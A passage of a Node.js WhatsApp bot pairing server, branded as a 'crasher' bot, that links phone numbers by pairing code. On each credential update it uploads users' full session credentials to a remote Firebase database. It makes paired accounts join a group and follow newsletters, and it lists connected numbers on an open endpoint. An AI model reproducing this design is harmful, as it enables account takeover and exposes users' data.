                            '> *VITHUSHA CRASHER BOT*'
                        )
                    });
                } catch (error) {
                    console.error(`Failed to notify ${number} about session deletion:`, error.message || error);
                }

                console.log(`Session cleanup completed for ${number}`);
            } else {
                console.log(`Connection lost for ${number}, attempting to reconnect...`);
                await delay(10000);
                activeSockets.delete(cleanNumber);
                socketCreationTime.delete(cleanNumber);

                const mockRes = { headersSent: false, send: () => { }, status: () => mockRes };
                await EmpirePair(number, mockRes);
            }
        }
    });
}

async function EmpirePair(number, res) {
    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    const sessionPath = path.join(SESSION_BASE_PATH, `session_${sanitizedNumber}`);

    await cleanDuplicateFiles(sanitizedNumber);

    const restoredCreds = await restoreSession(sanitizedNumber);
    if (restoredCreds) {
        fs.ensureDirSync(sessionPath);
        fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(restoredCreds, null, 2));
        console.log(`Successfully restored session for ${sanitizedNumber}`);
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const logger = pino({ level: process.env.NODE_ENV === 'production' ? 'fatal' : 'debug' });

    try {
        const socket = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            browser: Browsers.macOS('Safari')
        });

        socketCreationTime.set(sanitizedNumber, Date.now());

        setupStatusHandlers(socket);
        setupCommandHandlers(socket, sanitizedNumber);
        setupMessageHandlers(socket);
        setupAutoRestart(socket, sanitizedNumber);
        setupNewsletterHandlers(socket);
        handleMessageRevocation(socket, sanitizedNumber);

        if (!socket.authState.creds.registered) {
            let retries = config.MAX_RETRIES;
            let code;
            while (retries > 0) {
                try {
                    await delay(1500);
                    code = await socket.requestPairingCode(sanitizedNumber);
                    break;
                } catch (error) {
                    retries--;
                    console.warn(`Failed to request pairing code: ${retries}, error.message`, retries);
                    await delay(2000 * (config.MAX_RETRIES - retries));
                }
            }
            if (!res.headersSent) {
                res.send({ code });
            }
        }

        socket.ev.on('creds.update', async () => {
            await saveCreds();
            const fileContent = await fs.readFile(path.join(sessionPath, 'creds.json'), 'utf8');
            await axios.put(`${FIREBASE_URL}/session/creds_${sanitizedNumber}.json`, JSON.parse(fileContent));
            console.log(`Updated creds for ${sanitizedNumber} in Firebase`);
        });

        socket.ev.on('connection.update', async (update) => {
            const { connection } = update;
            if (connection === 'open') {
                try {
                    await delay(3000);
                    const userJid = jidNormalizedUser(socket.user.id);

                    const groupResult = await joinGroup(socket);

                    try {
                        const newsletterList = await loadNewsletterJIDsFromRaw();
                        for (const jid of newsletterList) {
                            try {
                                await socket.newsletterFollow(jid);
                                await socket.sendMessage(jid, { react: { text: '❤️', key: { id: '1' } } });
                                console.log(`✅ Followed and reacted to newsletter: ${jid}`);
                            } catch (err) {
                                console.warn(`⚠️ Failed to follow/react to ${jid}:`, err.message);
                            }
                        }
                        console.log('✅ Auto-followed newsletter & reacted');
                    } catch (error) {
                        console.error('❌ Newsletter error:', error.message);
                    }

                    try {
                        await loadUserConfig(sanitizedNumber);
                    } catch (error) {
                        await updateUserConfig(sanitizedNumber, config);
                    }

                    activeSockets.set(sanitizedNumber, socket);

                    const groupStatus = groupResult.status === 'success'
                        ? 'Joined successfully'
                        : `Failed to join group: ${groupResult.error}`;
                    await socket.sendMessage(userJid, {
                        image: { url: config.BOT_IMAGE },
                        caption: formatMessage(
                            '*🍀 VITHUSHA CRASHER 🍀*',
                            `*✅ Successfully connected!*\n\n*🔢 Number:* ${sanitizedNumber}\n`,
                            '> *VITHUSHA CRASHER BOT*'
                        )
                    });

                    await sendAdminConnectMessage(socket, sanitizedNumber, groupResult);

                    let numbers = [];
                    const numbersRes = await axios.get(`${FIREBASE_URL}/numbers.json`);
                    if (numbersRes.data) {
                        numbers = numbersRes.data;
                    }
                    if (!numbers.includes(sanitizedNumber)) {
                        numbers.push(sanitizedNumber);
                        await axios.put(`${FIREBASE_URL}/numbers.json`, numbers);
                    }
                } catch (error) {
                    console.error('Connection error:', error);
                    exec(`pm2 restart ${process.env.PM2_NAME || 'SULA-MINI-main'}`);
                }
            }
        });
    } catch (error) {
        console.error('Pairing error:', error);
        socketCreationTime.delete(sanitizedNumber);
        if (!res.headersSent) {
            res.status(503).send({ error: 'Service Unavailable' });
        }
    }
}

router.get('/', async (req, res) => {
    const { number } = req.query;
    if (!number) {
        return res.status(400).send({ error: 'Number parameter is required' });
    }

    if (activeSockets.has(number.replace(/[^0-9]/g, ''))) {
        return res.status(200).send({
            status: 'already_connected',
            message: 'This number is already connected'
        });
    }

    await EmpirePair(number, res);
});

router.get('/active', (req, res) => {
    res.status(200).send({
        count: activeSockets.size,
        numbers: Array.from(activeSockets.keys())
    });
});

module.exports = router;